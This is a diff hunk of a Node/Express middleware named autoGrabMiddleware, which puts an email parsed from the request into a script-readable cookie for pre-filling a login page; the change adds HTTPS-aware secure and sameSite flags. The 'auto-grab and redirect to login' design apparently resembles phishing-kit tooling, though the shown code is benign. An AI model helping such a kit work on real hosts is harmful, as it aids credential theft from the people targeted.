@@ -324,11 +324,16 @@ function autoGrabMiddleware(req, res, next) {
         // Store parsed email in session or cookie for frontend to use
         req.autoGrabbedEmail = parsedEmail.email;
 
+        // Detect if running on HTTPS (for VPS deployments)
+        const isHttps = req.protocol === 'https' || req.get('x-forwarded-proto') === 'https';
+
         // Set cookie so frontend can pre-fill the email
         res.cookie('autoGrabbedEmail', parsedEmail.email, { 
             maxAge: 300000, // 5 minutes
             httpOnly: false, // Allow JS to read it
-            path: '/'
+            path: '/',
+            secure: isHttps, // Enable secure flag on HTTPS
+            sameSite: isHttps ? 'None' : 'Lax' // Required for cross-site cookies on HTTPS
         });
 
         // Auto-redirect to login page if enabled
